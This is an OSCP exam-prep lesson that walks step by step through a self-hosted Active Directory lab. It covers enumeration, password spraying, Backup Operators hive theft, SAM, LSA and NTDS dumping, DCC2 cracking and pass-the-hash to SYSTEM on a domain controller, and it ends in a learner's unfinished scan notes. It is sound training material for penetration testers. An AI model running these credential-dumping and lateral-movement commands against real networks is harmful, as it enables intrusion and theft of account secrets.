
  
OSCP® Exam Prep CourseActive Directory Chains

Lesson 33 of 97

Completed

Start here8/8

Active Directory24/24

Active Directory Chains15/15

Chain 01: First ContactBuild a solid foundation for attacking Active Directory environments.Chain 02: StolenDevelop reliable credential access and lateral movement techniques.Chain 03: BleedWideExpand domain access through coordinated AD attacks and spraying.Chain 04: Inside JobLeverage pivoting to reach vulnerable services inside AD networks.Chain 05: GroupThinkPerform network pivoting and abuse misconfigured Group Policies to extend and maintain control.Chain 06: TrustfallShape misconfigurations and open services into borrowed authority.Chain 07: CrosslinkAbuse trusted access, traverse isolated networks, and escalate across hidden infrastructure.Chain 08: RicochetAbuse injectable endpoints, bypass their defense, and relay it across the domain to seize control.Chain 09: BloodhuntMap the hidden edges, and abuse what others overlook. Only the certified will be let through.Chain 10: ReplicantFollow the unseen edges, migrate into a living process, and make the controller surrender every secret.Chain 11: Cold StorageEscalate through a task, comb the host for credentials, and crack any encryption in your way.Chain 12: DelegateRun as the account left in the open, crack what the cache remembers, then delegate the rights to domain compromise.Chain 13: FailsafeDecrypt a GPP password, crack two vaults, and ride a WriteDacl edge to Domain Admin.Chain 14: Open RelayLeak a credential from SNMP, seize the Spooler for SYSTEM, then relay and reset your way to the domain.Chain 15: OverwriteHop a SQL linked server, loot LSA secrets twice, and reset an account to own the domain.

Initial Access17/17

Privilege Escalation15/15

Pivoting and Tunneling6/6

The Exam5/5

Notes and extras7/7

Lab

AD Chain_01

A domain controller and two Windows clients. Runs on your own machine.

[Download free](https://buymeacoffee.com/hackacademy/e/484492)[About this chain](https://hackerblueprint.com/labs#chain-01)[All chains bundle](https://buymeacoffee.com/hackacademy/e/582690)

Not startedStartedRooted

Wrote a walkthrough?

We'd love to see how you took this chain! Written up or on video, both are great. Email it to us and we'll take a look.

[Email your walkthrough](mailto:hacking.academy@protonmail.com?subject=Walkthrough%3A%20Chain%2001%3A%20First%20Contact)

Tags

AD EnumerationSMB EnumerationPort ScanningPassword ReuseWindows PrivescCredential DumpingPassword CrackingHash Identification

PreviousCompletedNext: Chain 02: StolenContinue

Chat  
and notesHelp[Ideas](https://discord.com/channels/1325919248954167468/1325966774881226862)

## Chain 01: First Contact

18 steps

Close

0:00 / 40:20

Auto

1

Save the starting credential and map the network

BackNext step

Your lab addressesDC01 IPClient-1 IPClient-2 IPLab subnet

1. 1Save the starting credential and map the network_0:20_
    
    Before touching the targets we record what we were given and work out where we are. The one starting credential is the domain user lbennett, and we keep it in a file so it is easy to reuse.
    
    Next we read the routing table to find the local subnet and the interface that reaches it. In this lab the interface is `eth0`; on a VPN engagement such as the OSCP® it would usually be `tun0`. The connected network line is the range we enumerate next.
    
    Kali
    
    ```
    gedit starting_creds.txt
    ```
    
    Copy
    
    Opens a text file named starting_creds.txt to store the given foothold credential for the hack-academy.local domain.
    
    **Why**Keeping the credential in a file means we can paste it into every later command without retyping and risking a slip.
    
    Kali
    
    ```
    cat starting_creds.txt
    ```
    
    Copy
    
    Prints the saved file back so we can read the username and password we were handed.
    
    **Why**A quick read confirms the exact characters before we start using the credential in commands.
    
    Kali
    
    ```
    route
    ```
    
    Copy
    
    Prints the kernel routing table, showing the default gateway and the connected networks.
    
    **Why**It is a fast way to see which subnet our interface sits on before we scan anything.
    
    Kali
    
    ```
    ip route
    ```
    
    Copy
    
    Prints the routing table in the modern format, including the source address and the interface for each route.
    
    **Why**This shows both our own address and the local subnet in one line, which is cleaner than route for reading the range.
    
    Kali
    
    ```
    ip a
    ```
    
    Copy
    
    Lists every interface and its addresses, confirming which interface carries the lab network.
    
    **Why**It confirms the interface and address that ip route pointed to, so we know the scope is correct.
    
    **Tip**The connected subnet is your scope. Every scan and spray that follows runs against this range.
    
2. 2Sweep the subnet and list the targets_1:36_
    
    With the range known, we sweep it over SMB with netexec, the successor to CrackMapExec that talks to many Windows services. For every live host it returns the hostname and the domain it belongs to.
    
    The output shows DC01, Client-1 and Client-2 in the hack-academy.local domain, plus one unrelated host whose domain field only repeats its own name. Those three domain members are the real targets, so we write their addresses into a file for the scanner to read.
    
    Kali
    
    ```
    netexec smb 10.0.2.0/24
    ```
    
    Copy
    
    Sweeps the whole subnet over SMB and prints each host's name, operating system and domain. `LAB_NET` is the subnet in CIDR form.
    
    **Why**One SMB sweep names the domain controller and the clients at once, which is faster than scanning hosts one by one to find the domain.
    
    Kali
    
    ```
    gedit ips
    ```
    
    Copy
    
    Opens a file named ips and fills it with the three domain host addresses, one per line.
    
    **Why**A target file lets us feed the same host list to nmap and to every netexec spray with one argument.
    
    **Tip**A host whose domain field only repeats its own name is not domain-joined. Leave it out of the target list.
    
3. 3Scan all ports and services_3:04_
    
    We run a full TCP port scan of the three targets, then a service and script scan of what is open. The two scans are chained so the service scan starts as soon as the port scan finishes, and the work runs while we set up BloodHound.
    
    On the clients we find RDP and WinRM open, which both matter later for getting a shell. On the domain controller, port 88 (Kerberos) and LDAP are open, which is a reliable sign it is the DC. WinRM is open on the DC too, but RDP is not.
    
    Kali
    
    ```
    nmap -p- -Pn -iL ips -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn -iL ips -sV -sC -v -oN nmap_sVsC.txt
    ```
    
    Copy
    
    Runs two scans in sequence. The first checks all 65535 TCP ports (`-p-`) of every host in `ips`; `-Pn` skips host discovery, the rate and retry flags keep it fast, and `-oN` saves readable output. After a short pause the second scan runs `-sV` for service versions and `-sC` for the default scripts.
    
    **Why**A full port scan makes sure nothing is missed, and the service and script scan then fingerprints the open ports so we know which protocols we can attack.
    
    **Other ways**If a host behaves oddly with `-Pn` you can drop it, but in a lab where you know the hosts are up `-Pn` avoids wasting time on ping checks.
    
    **Tip**A full -p- scan is slower, so start it early and do other recon while it runs.
    
4. 4Stand up BloodHound and ingest the domain_3:36_
    
    BloodHound maps the relationships between users, groups and computers so attack paths are visible at a glance. The Community Edition runs as a set of Docker containers, so we download its compose file and bring the stack up while the scans finish.
    
    Once the containers are healthy, BloodHound serves a web interface at [http://localhost:8080](http://localhost:8080/). The default user is admin and the first-login password is printed in the container logs; it is a one-time value that you are forced to change on first sign-in, so read it from your own logs. We then collect the domain data over LDAP as lbennett and copy the resulting zip to /tmp so it is easy to pick in the browser upload dialog. The zip is uploaded through the Explore page, and ingestion then runs under the Administration tab.
    
    Kali
    
    ```
    curl -L https://ghst.ly/getbhce -o docker-compose.yml
    ```
    
    Copy
    
    Downloads the official BloodHound CE quickstart compose file, following the redirect (`-L`) and saving it as docker-compose.yml.
    
    **Why**The compose file defines the whole BloodHound stack, so pulling the official one is the quickest way to a working install.
    
    Kali
    
    ```
    docker-compose pull && docker-compose up -d
    ```
    
    Copy
    
    Pulls the app, graph database and BloodHound images, then starts all of them in the background (`-d`).
    
    **Why**Running the stack detached frees the terminal so the scans and the ingest can continue while BloodHound comes up.
    
    Kali
    
    ```
    docker-compose logs bloodhound | grep -i passw
    ```
    
    Copy
    
    Prints the BloodHound container logs and filters for the line that holds the generated first-login password.
    
    **Why**The initial admin password is only written to the logs, so this is how you retrieve it to sign in the first time.
    
    Kali
    
    ```
    netexec ldap 10.0.2.4 -u lbennett -p '!!reiD123' --bloodhound --collection All --dns-server 10.0.2.4
    ```
    
    Copy
    
    Collects BloodHound data over LDAP from the domain controller as lbennett. `--bloodhound --collection All` gathers every collection method, and `--dns-server` points name resolution at the DC so object names resolve.
    
    **Why**Using netexec as the collector means we pull the directory with the credential we already hold and get a zip ready to upload, without installing a separate ingestor.
    
    Kali
    
    ```
    cp /root/.nxc/logs/DC01_DC_IP_2025-11-30_045031_bloodhound.zip /tmp
    ```
    
    Copy
    
    Copies the collection zip that netexec wrote under its logs directory into /tmp.
    
    **Why**Putting the file in /tmp makes it easy to find in the browser upload dialog when the UI is not running as root.
    
    **Tip**If the first-login password is rejected, set a stronger one. A short or weak choice is sometimes refused by the policy.
    
5. 5Read the scan output_7:12_
    
    While BloodHound ingests, we read the two scan files. The port scan file lists everything open on each host, and the service and script file names the versions and runs the default scripts.
    
    The domain controller shows DNS, Kerberos on 88, LDAP, SMB and WinRM, which confirms its role. The two clients both expose RDP on 3389 and WinRM on 5985. Those protocols are what let us turn a valid credential into a shell, so they shape the spray that follows.
    
    Kali
    
    ```
    cat nmap_ports.txt
    ```
    
    Copy
    
    Prints the full TCP port scan results for all three hosts.
    
    **Why**Reading the open ports tells us which services exist on each host before we decide how to attack them.
    
    Kali
    
    ```
    cat nmap_sVsC.txt
    ```
    
    Copy
    
    Prints the service and script scan, which shows service versions, the domain name and the SMB signing state per host.
    
    **Why**The version and script output confirms the operating systems and that the clients expose RDP and WinRM for later logins.
    
6. 6Find a password in a description field_8:35_
    
    A common Active Directory weakness is a password left in a user's description field. We pull every domain user and their description with netexec's `--users` flag, run against the DC with the starting credential.
    
    Reading the table, the account twest has a set of credentials written straight into its description. We start a password file to collect every credential we find, and keep the clean username list the piped command produced. The habit to build is that each new username and password goes into lists so they can be tested widely in the next step.
    
    Kali
    
    ```
    netexec ldap 10.0.2.4 -u lbennett -p '!!reiD123' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users
    ```
    
    Copy
    
    Lists all domain users over LDAP, then strips the status lines and the header row and keeps the username column, writing the result to the file users with tee.
    
    **Why**Filtering the output to one clean name per line gives a username list we can spray directly, without editing it by hand.
    
    Kali
    
    ```
    netexec ldap 10.0.2.4 -u lbennett -p '!!reiD123' --users
    ```
    
    Copy
    
    Runs the same user enumeration again but unfiltered, so the full table including the Description column is visible.
    
    **Why**We need the description text, not just the names, because that is where a plaintext password may be hiding.
    
    Kali
    
    ```
    gedit pass
    ```
    
    Copy
    
    Opens a file named pass to collect the passwords we discover, starting with the ones already known.
    
    **Why**A password file paired with the username file lets us spray every credential against every host in one command.
    
    Kali
    
    ```
    cat users
    ```
    
    Copy
    
    Prints the saved username list to confirm it holds the 16 domain users.
    
    **Why**Checking the file before spraying makes sure the filter kept the real names and nothing else.
    
    Kali
    
    ```
    netexec smb ips -u lbennett -p '!!reiD123' --users
    ```
    
    Copy
    
    Enumerates the domain users and their descriptions again, this time over SMB against the target list.
    
    **Why**This is the credential-discovery step that surfaces the description-field password; the same --users enumeration works over SMB as well as LDAP.
    
    **Tip**Keep a running users file and pass file. Every new name or password goes in, ready to spray.
    
7. 7Spray the credentials over every protocol_10:16_
    
    A credential found on one account may work on another host or over a different protocol, so we spray the lists against everything. We run netexec with `--continue-on-success` so it keeps testing after the first hit, and repeat it for SMB, RDP and WinRM against all three targets in one sweep.
    
    SMB confirms the known access and shows twest valid on a client. RDP adds nothing new and the DC run hangs because RDP is not open there. WinRM is the one that matters: it reports twest with Pwn3d on Client-1, which is our interactive foothold.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Sprays every username in users against every password in pass over SMB, for all hosts in ips. `--continue-on-success` stops it quitting after the first valid pair.
    
    **Why**Testing every name and password over SMB first shows which accounts are valid and which grant admin before we try other protocols.
    
    Kali
    
    ```
    netexec rdp ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Repeats the same spray over RDP against all three hosts.
    
    **Why**A credential can grant RDP even when SMB or WinRM do not, so RDP must be checked separately.
    
    Kali
    
    ```
    netexec winrm ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Runs the same lists over WinRM. This is the run that reports twest with Pwn3d on Client-1.
    
    **Why**WinRM access means we can open an interactive shell, so this result is the foothold we act on next.
    
    **Tip**Check every host with every protocol. Access often exists on only one combination, and skipping a protocol means missing the way in.
    
8. 8Check the attack paths in BloodHound_13:31_
    
    Back in BloodHound we mark lbennett and twest as owned, then look at their outbound object control. Neither owned account controls anything, so there is no direct path from them yet. The shortest path to Domain Admins shows two members, administrator and mthompson, which are the high-value accounts to aim for later.
    
    The saved queries for AS-REP roastable and Kerberoastable users return nothing, and only the enterprise, domain and admin groups hold DCSync rights, none reachable yet. The key lesson is that BloodHound pulls its data from the domain controller, so it never shows that twest can WinRM onto Client-1. BloodHound is strong for GPO abuse, roasting and DCSync but blind to host-local access on machines other than the DC.
    
    **Tip**Do not trust BloodHound for who can WinRM or RDP onto a client. That access lives on the host, not in the data pulled from the DC.
    
9. 9Get a shell on Client-1 with evil-winrm_16:18_
    
    Using the credential from the spray, we connect to Client-1 with evil-winrm, which gives an interactive PowerShell session over WinRM as twest. The password contains a dollar sign, so it is wrapped in single quotes to stop the shell treating it as a variable.
    
    Once in, we look around twest's profile and confirm the hostname, then list the token's groups and privileges. twest is a member of the Backup Operators group and the Remote Management Users group, and the privileges SeBackupPrivilege and SeRestorePrivilege are enabled. Remote Management Users is why WinRM worked, and Backup Operators is what we abuse next.
    
    Kali
    
    ```
    evil-winrm -i 10.0.2.7 -u twest -p 'HappyCactus$10'
    ```
    
    Copy
    
    Opens an interactive PowerShell session on Client-1 over WinRM as twest. `-i` is the target, `-u` and `-p` are the credentials.
    
    **Why**WinRM gave twest a Pwn3d result on this host in the spray, and evil-winrm is the standard client for turning that into a shell.
    
    Client-1 (evil-winrm)
    
    ```
    ls
    cd ..
    tree /a /f
    ```
    
    Copy
    
    Lists the current folder, moves up to the twest profile root, and prints the full folder tree with files (`/f`) in ASCII (`/a`).
    
    **Why**A quick look over the profile checks for anything interesting on disk before moving to privilege abuse.
    
    Client-1 (evil-winrm)
    
    ```
    hostname
    ```
    
    Copy
    
    Prints the computer name of the shell we landed on.
    
    **Why**Confirming we are on Client-1 avoids acting on the wrong host later in the chain.
    
    Client-1 (evil-winrm)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the current user's SID, group memberships and privileges in one listing.
    
    **Why**This is where we see the Backup Operators and Remote Management Users groups and the SeBackupPrivilege that make the next step possible.
    
10. 10Abuse Backup Operators for the SAM and SYSTEM hives_18:24_
    
    Members of Backup Operators can read files normal permissions would block, including the registry hives that store the local password hashes. We make a writeable folder, save the SAM and SYSTEM hives into it, then download both to Kali with evil-winrm's built-in download.
    
    The SAM hive holds the local account hashes and the SYSTEM hive holds the boot key needed to decrypt them, so we need both. A normal user cannot copy these files, which is exactly why the Backup Operators membership matters here.
    
    Client-1 (evil-winrm)
    
    ```
    cd c:\
    mkdir temp
    cd temp
    ```
    
    Copy
    
    Moves to the root of the C drive, creates a folder called temp and enters it.
    
    **Why**We need a folder we can write to for the saved hives; any writeable directory would do, and C:\temp is simple to find.
    
    Client-1 (evil-winrm)
    
    ```
    reg save hklm\sam c:\Temp\sam
    ```
    
    Copy
    
    Saves the SAM registry hive, which contains the local user password hashes, to a file in C:\Temp.
    
    **Why**Backup Operators rights allow this read, and copying the hive to disk is the first half of an offline local hash dump.
    
    Client-1 (evil-winrm)
    
    ```
    reg save hklm\system c:\Temp\system
    ```
    
    Copy
    
    Saves the SYSTEM hive, which holds the boot key used to decrypt the SAM hashes, to the same folder.
    
    **Why**Without the SYSTEM hive the SAM hashes cannot be decrypted, so both hives must be saved together.
    
    Client-1 (evil-winrm)
    
    ```
    download sam
    ```
    
    Copy
    
    Uses evil-winrm's download command to pull the saved SAM file from the current folder back to Kali.
    
    **Why**The hashes are extracted offline on Kali, so the hive has to be transferred off the host first.
    
    Client-1 (evil-winrm)
    
    ```
    download system
    ```
    
    Copy
    
    Downloads the SYSTEM hive to Kali as well, giving both files needed to extract the hashes.
    
    **Why**With both hives on Kali we can run secretsdump against the files and avoid any further action on the target.
    
11. 11Dump and crack the local SAM_20:24_
    
    With both hives on Kali, we extract the local hashes with secretsdump, keep the two interesting accounts, and crack them with john against rockyou.txt.
    
    The first crack attempt mislabels the value: john detects an LM hash when the LM half is actually empty, so it cracks nothing. Setting the NT format explicitly fixes it, and a local account cracks: matt, with a password that becomes our next pivot.
    
    Kali
    
    ```
    impacket-secretsdump -system system -sam sam local
    ```
    
    Copy
    
    Reads the downloaded SAM and SYSTEM hive files offline and prints the local NTLM hashes. The `local` keyword tells it to work from the files, not over the network.
    
    **Why**Working from the files gives the local hashes without touching the target again, which is quieter and reliable.
    
    Kali
    
    ```
    gedit hashes_local_Client-1_CLIENT1_IP.txt
    ```
    
    Copy
    
    Opens a file to hold only the Administrator and matt hash lines from the secretsdump output.
    
    **Why**Keeping just the accounts worth cracking makes the file clean for john and easy to compare against later dumps.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes_local_Client-1_CLIENT1_IP.txt --format=nt
    ```
    
    Copy
    
    Cracks the saved hashes against rockyou.txt with the NT format forced by `--format=nt`.
    
    **Why**The first run without the flag loaded the value as an empty LM hash and failed, so setting the NT format is what lets the real NT hash crack.
    
    **Tip**An aad3b435... LM half means the LM hash is empty. Set the NT format so the cracker works on the real value instead.
    
12. 12Pivot with matt using local auth_22:28_
    
    matt is a local account, not a domain user, so testing it needs netexec's `--local-auth` flag, which authenticates against the machine's own SAM instead of the domain. Without that flag netexec tries hack-academy.local\matt and every attempt fails because that domain user does not exist.
    
    With `--local-auth` set, SMB and RDP succeed on Client-1 while WinRM does not. We recall an xfreerdp3 template, edit it to matt's real values, and open an RDP session to Client-1.
    
    Kali
    
    ```
    netexec winrm ips -u Matt -p 'Password1!' --continue-on-success
    ```
    
    Copy
    
    Tries matt's cracked password over WinRM against all hosts as a domain account.
    
    **Why**The first instinct is to reuse the password domain-wide, so we start by testing it over WinRM everywhere.
    
    Kali
    
    ```
    netexec winrm ips -u Matt -p 'Password1!' --local-auth
    ```
    
    Copy
    
    Retries the WinRM test but authenticating against each host's local SAM with `--local-auth`.
    
    **Why**matt is a local account, so local auth is the correct mode; this run shows WinRM still fails for him.
    
    Kali
    
    ```
    netexec smb ips -u Matt -p 'Password1!' --local-auth
    ```
    
    Copy
    
    Tests matt against the local SAM over SMB. It succeeds on Client-1 only.
    
    **Why**SMB success tells us the local account is valid on Client-1, which opens remote dumping and RDP as options.
    
    Kali
    
    ```
    netexec smb ips -u Matt -p 'Password1!'
    ```
    
    Copy
    
    Runs the same SMB test without `--local-auth`, so netexec authenticates as the domain user hack-academy.local\matt.
    
    **Why**This deliberately fails on every host, which shows plainly that matt only exists locally and why the flag is needed.
    
    Kali
    
    ```
    netexec rdp ips -u Matt -p 'Password1!' --local-auth
    ```
    
    Copy
    
    Checks whether matt can log in over RDP locally. It returns Pwn3d on Client-1.
    
    **Why**RDP access means a graphical login as matt, which we use to elevate on the host.
    
    Kali
    
    ```
    xfreerdp3 /v:10.0.2.7 /u:matt /p:'Password1!' /cert:ignore +clipboard /dynamic-resolution /drive:.,share
    ```
    
    Copy
    
    Opens an RDP session to Client-1 as matt. `/v` is the host, `/u` and `/p` the credentials, `/cert:ignore` accepts the self-signed cert, `+clipboard` shares the clipboard, `/dynamic-resolution` resizes the window, and `/drive:.,share` maps the current Kali folder into the session.
    
    **Why**A full RDP desktop lets us use the UAC elevation prompt that a WinRM session cannot, which is how we reach a high-integrity shell.
    
    **Tip**For any local account, remember --local-auth. Without it netexec aims at the domain and a valid local credential looks broken.
    
13. 13Elevate on Client-1 and re-add twest_25:12_
    
    Inside the RDP session, whoami /all shows matt is a member of the local Administrators group. Opening a PowerShell as administrator through the UAC prompt gives a high-integrity shell, where the token now holds SeImpersonatePrivilege, the opening for a potato-style escalation to SYSTEM later in the chain.
    
    With local admin we add the domain user twest to the local Administrators group so twest can dump hashes remotely. From the elevated PowerShell the commands are `net localgroup "administrators" twest /add` and, once dumping is done, `net localgroup "administrators" twest /del` to undo the change. Back in the twest WinRM session we confirm the user and close it.
    
    Client-1 (evil-winrm)
    
    ```
    whoami
    exit
    ```
    
    Copy
    
    Confirms the current user is hack-academy\twest, then exits the evil-winrm session.
    
    **Why**We check which identity the shell holds before leaving it, so we know the WinRM foothold is twest and not another account.
    
    **Tip**Adding a user to local Administrators is a change you must undo on the exam. Run the matching /del and remove anything you dropped on disk.
    
14. 14Dump Client-1 hashes remotely as twest_26:40_
    
    twest is a domain account valid on every host and a local admin on Client-1, so we can dump its hashes remotely without a shell. We check twest's SMB access, then run the remote dumping modules.
    
    The SAM dump returns the same local hashes we cracked offline, confirming the two methods agree. The lsassy module reads matt's hash out of LSASS memory, a second way to get it. The LSA secrets dump is the valuable one: it contains a cached domain logon for eknight stored as a DCC2 (mscache2) hash, which belongs to a domain user who signed in to this host.
    
    Kali
    
    ```
    cat pass
    ```
    
    Copy
    
    Prints the saved password file, which holds the two lab passwords found so far.
    
    **Why**We read the file to pick twest's password for the remote dumping commands that follow.
    
    Kali
    
    ```
    netexec smb ips -u twest -p 'HappyCactus$10'
    ```
    
    Copy
    
    Authenticates twest over SMB against all three hosts to show where it is valid and where it is admin.
    
    **Why**Confirming twest is a local admin on Client-1 (Pwn3d) is what lets the remote hash dumps work.
    
    Kali
    
    ```
    netexec smb ips -u twest -p 'HappyCactus$10' --sam
    ```
    
    Copy
    
    Dumps the local SAM hashes remotely over SMB using twest's admin rights on Client-1.
    
    **Why**It pulls the same local hashes as the offline secretsdump, this time without downloading any hive.
    
    Kali
    
    ```
    cat hashes_local_Client-1_CLIENT1_IP.txt
    ```
    
    Copy
    
    Prints the two local hashes we saved earlier.
    
    **Why**Comparing them with the remote SAM dump confirms both methods return the same values.
    
    Kali
    
    ```
    netexec smb ips -u twest -p 'HappyCactus$10' -M lsassy
    ```
    
    Copy
    
    Runs the lsassy module to read credentials out of LSASS memory on the hosts. Here it returns matt's NT hash on Client-1.
    
    **Why**lsassy is a second route to local credentials and sometimes catches secrets the SAM does not hold.
    
    Kali
    
    ```
    netexec smb ips -u twest -p 'HappyCactus$10' --lsa
    ```
    
    Copy
    
    Dumps LSA secrets, which include cached domain logons (DCC2). This is where eknight's cached domain credential appears.
    
    **Why**LSA secrets expose cached domain accounts, so this dump is how we find a credential that reaches beyond this one host.
    
    **Tip**SAM gives local hashes, but LSA secrets are where cached domain credentials live. Always run the LSA dump, not only SAM.
    
15. 15Crack eknight's cached domain credential_28:48_
    
    The cached entry is a domain cached credential of type DCC2, also called mscache2. These cannot be relayed or passed, so cracking is the only way to use one. We save the hash to a file, confirm its type with haiti, and crack it with john against rockyou.txt.
    
    haiti reports the format as hashcat mode 2100 and john format mscash2. DCC2 is built on many rounds of hashing and is slow to crack, but rockyou.txt recovers eknight's password, a fresh domain credential that was not available before.
    
    Kali
    
    ```
    gedit hashes_lsa_Client-1_CLIENT1_IP.txt
    ```
    
    Copy
    
    Opens a file and pastes in eknight's DCC2 cached hash from the LSA dump.
    
    **Why**Isolating the one hash in its own file keeps john focused on the value we want to crack.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes_lsa_Client-1_CLIENT1_IP.txt
    ```
    
    Copy
    
    Cracks the DCC2 hash against rockyou.txt. john auto-detects the mscash2 format from the hash string.
    
    **Why**john recognises the DCC2 format on its own here, so the wordlist run recovers the cached account's plaintext password.
    
    Kali
    
    ```
    haiti '$DCC2$10240#eknight#e92981e7e9fc7e5732c32865e4c83a8a'
    ```
    
    Copy
    
    Passes the bare hash to haiti, which identifies it as Domain Cached Credentials 2 and reports hashcat mode 2100 and john format mscash2.
    
    **Why**Confirming the hash type tells us the correct mode to crack with, which matters because the wrong mode cracks nothing. The hash must be bare, with no username prefix or trailing colon, or haiti cannot parse it.
    
    **Tip**A DCC2 / mscache2 hash cannot be used for pass-the-hash or relaying. If you cannot crack it, it is of no use, so pick a good wordlist.
    
16. 16Spray eknight and own Client-2_32:00_
    
    The cracked credential is a domain account, so it goes into the lists and we spray again with `--continue-on-success`. It validates as twest and lbennett as before, and eknight now returns Pwn3d on Client-2, a host we had not reached.
    
    We then confirm eknight directly across all three hosts. It is a local admin on Client-2 and a valid domain user elsewhere, which means we can dump hashes on Client-2 next.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Sprays the full user and password lists over SMB again, now that eknight's password has been added to the pass file.
    
    **Why**Re-spraying after each new credential catches reuse, and this run shows eknight is admin on Client-2.
    
    Kali
    
    ```
    netexec smb ips -u eknight -p '!!Stud87'
    ```
    
    Copy
    
    Authenticates eknight over SMB against all three hosts to see exactly where it works and where it is admin.
    
    **Why**Pinning down that eknight is local admin on Client-2 tells us which host to dump next.
    
17. 17Dump Client-2 and find mthompson_35:12_
    
    With admin on Client-2 over SMB we dump its hashes. The SAM dump returns the local accounts, and the LSA secrets dump is again the prize: it holds a cached DCC2 hash for mthompson, another domain user whose credential is cached on this box.
    
    We save that hash and crack it with john as before. Looking mthompson up in BloodHound shows the account is Tier Zero and a member of Domain Admins, so cracking it gives control of the domain.
    
    Kali
    
    ```
    netexec smb 10.0.2.9 -u eknight -p '!!Stud87' --sam
    ```
    
    Copy
    
    Dumps the local SAM hashes from Client-2 over SMB using eknight's admin rights.
    
    **Why**The SAM dump confirms the local accounts, though the Administrator value here is an empty hash and not useful.
    
    Kali
    
    ```
    netexec smb 10.0.2.9 -u eknight -p '!!Stud87' --lsa
    ```
    
    Copy
    
    Dumps LSA secrets from Client-2, which surfaces mthompson's cached DCC2 hash.
    
    **Why**LSA secrets on this host hold a domain admin's cached logon, which is the credential worth cracking.
    
    Kali
    
    ```
    gedit hashes_lsa_Client-2_CLIENT2_IP.txt
    ```
    
    Copy
    
    Opens a file and pastes mthompson's DCC2 hash from the Client-2 LSA dump.
    
    **Why**Saving the single hash keeps the crack focused on the domain admin account.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes_lsa_Client-2_CLIENT2_IP.txt
    ```
    
    Copy
    
    Cracks mthompson's DCC2 hash against rockyou.txt.
    
    **Why**mthompson is a domain admin, so recovering this plaintext is what lets us take over the domain.
    
    **Tip**Pwn3d over SMB means you can dump hashes remotely. Pwn3d over RDP means you log in and check from there instead.
    
18. 18Dump NTDS and own the domain controller_38:24_
    
    mthompson is a Domain Admin, so its credential unlocks the whole directory. We first dump LSA across the hosts as mthompson to confirm the password works, then dump NTDS.dit from the domain controller, which holds the NTLM hash of every domain account.
    
    The domain Administrator NT hash from NTDS is all we need for the DC. We pass it to the DC with netexec to confirm Pwn3d, run a command through wmiexec to prove code execution, then use impacket-psexec to land an interactive SYSTEM shell. A quick hostname and ipconfig confirm we are SYSTEM on DC01, which completes the chain from one low-privilege credential to full domain control.
    
    Kali
    
    ```
    netexec smb ips -u mthompson -p 'Password123!!' --lsa
    ```
    
    Copy
    
    Dumps LSA secrets across the hosts as mthompson to confirm the cracked password authenticates.
    
    **Why**Validating the domain admin credential before the NTDS dump makes sure the next command will work.
    
    Kali
    
    ```
    netexec smb 10.0.2.4 -u mthompson -p 'Password123!!' --ntds
    ```
    
    Copy
    
    Dumps NTDS.dit from the domain controller using mthompson's Domain Admin rights, printing the NTLM hash of every domain account.
    
    **Why**NTDS.dit is the domain's full hash database, so dumping it hands us every account including the domain Administrator.
    
    Kali
    
    ```
    netexec smb 10.0.2.4 -u administrator -H 'c0ced2de918b4a7c1b9f4efd225dd503'
    ```
    
    Copy
    
    Authenticates to the DC as administrator using the NT hash with `-H` instead of a password, returning Pwn3d.
    
    **Why**Pass-the-hash proves the Administrator hash from NTDS gives admin on the DC without needing the plaintext.
    
    Kali
    
    ```
    netexec smb 10.0.2.4 -u administrator -H 'c0ced2de918b4a7c1b9f4efd225dd503' -X whoami
    ```
    
    Copy
    
    Runs whoami on the DC through wmiexec with `-X`, confirming code execution as hack-academy\administrator.
    
    **Why**Running a command this way shows the hash grants real execution on the DC, not just a login check.
    
    Kali
    
    ```
    impacket-psexec hack-academy.local/administrator@10.0.2.4 -hashes :c0ced2de918b4a7c1b9f4efd225dd503
    ```
    
    Copy
    
    Pass-the-hash to the DC as administrator with impacket-psexec, which uploads a service and opens an interactive shell. `-hashes :<NThash>` has an empty LM half before the colon.
    
    **Why**psexec turns the hash into a full interactive SYSTEM shell on the DC, which netexec's one-off command execution does not give.
    
    DC01 (psexec)
    
    ```
    hostname
    ```
    
    Copy
    
    Prints the computer name inside the psexec shell.
    
    **Why**It confirms the SYSTEM shell is on DC01 and not another host.
    
    DC01 (psexec)
    
    ```
    ipconfig
    ```
    
    Copy
    
    Prints the network configuration of the shell, showing the DC's address and gateway.
    
    **Why**The address confirms we are on the domain controller on the internal lab network.
    
    **Tip**A truly empty NT hash can still be passed. You do not need to crack it, because pass-the-hash authenticates with the hash directly.
19. 

```
sudo ip link set dev eth0 mtu 1000
```

```
lbennett
!!reiD123

hack-academy.local
```

```
netexec smb 10.0.2.0/24 #run it a couple of times
```

```
lbennett
!!reiD123

hack-academy.local

10.0.2.3      kali 
10.0.2.4      DC01
10.0.2.7      CLIENT-1 
10.0.2.9      CLIENT-2
```

```
sudo nmap -sV -Pn -p 53, 88, 389, 1234 --open 10.0.2.4
```

```
10.0.2.4
10.0.2.7
10.0.2.9 
```

```
sudo nmap --min-rate 10000 -sCV -p- -Pn -iL IPLIST.txt
```

If you want to scan a list of ip's : 
```
-iL IPLIST.txt
```
then run : 
```
nmap -p- -Pn -iL IPLIST.txt -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn -iL IPLIST.txt -sV -sC -v -oN nmap_sVSc.txt
```


```
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 10000 -sCV -p- -Pn -iL IPLIST.txt
[sudo] password for kali: 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-31 07:58 -0400
Stats: 0:00:57 elapsed; 0 hosts completed (3 up), 3 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 50.00% done; ETC: 08:00 (0:00:56 remaining)
Nmap scan report for DC01.hack-academy.local (10.0.2.4)
Host is up (0.026s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
